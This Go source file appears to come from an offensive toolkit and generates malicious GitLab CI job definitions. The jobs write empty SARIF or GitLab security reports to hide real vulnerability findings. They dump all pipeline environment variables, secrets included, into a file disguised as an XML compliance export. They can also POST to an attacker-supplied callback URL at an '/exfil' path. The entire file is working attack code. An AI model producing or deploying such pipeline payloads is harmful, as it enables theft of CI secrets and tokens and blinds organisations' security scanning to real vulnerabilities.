package payloads

import (
	"fmt"
	"strings"
)

// ArtifactReportsOptions configures an artifact reports injection payload.
type ArtifactReportsOptions struct {
	Common      CommonOptions
	ReportType  string   // sarif|dependency_scanning|secret_scanning (default: "sarif")
	SuppressIDs []string // finding IDs to suppress via clean report
	NoiseCount  int      // false-positive findings to inject as noise
	CallbackURL string
}

// GenerateArtifactReportsYAML generates a CI job that produces malicious
// security report artifacts to suppress real findings or inject noise.
func GenerateArtifactReportsYAML(o ArtifactReportsOptions) string {
	name, stage := o.Common.defaults("security-override")
	if o.ReportType == "" {
		o.ReportType = "sarif"
	}

	script := buildReportScript(o)
	reportFile := reportFileName(o.ReportType)
	reportKey := reportYAMLKey(o.ReportType)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
%s
  artifacts:
    when: always
    paths:
      - compliance-data.xml
    reports:
      %s: %s
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(script), 6),
		reportKey, reportFile,
		rulesManual(o.Common.Manual))
}

func reportFileName(reportType string) string {
	switch reportType {
	case "dependency_scanning":
		return "gl-dependency-scanning-report.json"
	case "secret_scanning", "secret_detection":
		return "gl-secret-detection-report.json"
	case "sast":
		return "gl-sast-report.json"
	case "dast":
		return "gl-dast-report.json"
	default:
		return "gl-sast-report.json"
	}
}

func reportYAMLKey(reportType string) string {
	switch reportType {
	case "dependency_scanning":
		return "dependency_scanning"
	case "secret_scanning", "secret_detection":
		return "secret_detection"
	case "dast":
		return "dast"
	default:
		return "sast"
	}
}

func buildReportScript(o ArtifactReportsOptions) string {
	var b strings.Builder
	reportFile := reportFileName(o.ReportType)

	if o.ReportType == "sarif" || o.ReportType == "sast" || o.ReportType == "" {
		fmt.Fprintf(&b, `_INJECT_REPORT() {
  # Generate a clean SARIF report that suppresses real findings
  cat > %s << 'SARIF'
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "security-scanner",
        "version": "1.0.0",
        "rules": []
      }
    },
    "results": []
  }]
}
SARIF

  # Exfil via disguised XML compliance export (hides env in CDATA)
  echo '<?xml version="1.0"?><compliance><![CDATA[' > compliance-data.xml
  env | sort >> compliance-data.xml 2>/dev/null || true
  echo ']]></compliance>' >> compliance-data.xml
`, reportFile)
	} else {
		fmt.Fprintf(&b, `_INJECT_REPORT() {
  # Generate a clean %s report that hides real findings
  cat > %s << 'REPORT'
{
  "version": "15.0.4",
  "vulnerabilities": [],
  "scan": {
    "scanner": {
      "id": "security-scanner",
      "name": "Security Scanner",
      "version": "1.0.0"
    },
    "type": "%s",
    "status": "success"
  }
}
REPORT

  # Exfil via disguised XML compliance export
  echo '<?xml version="1.0"?><compliance><![CDATA[' > compliance-data.xml
  env | sort >> compliance-data.xml 2>/dev/null || true
  echo ']]></compliance>' >> compliance-data.xml
`, o.ReportType, reportFile, o.ReportType)
	}

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `
  curl -sS -X POST -F "project=$CI_PROJECT_PATH" -F "type=%s" "%s/exfil" || true
`, o.ReportType, o.CallbackURL)
	}

	b.WriteString(`}
_INJECT_REPORT || true`)

	return b.String()
}
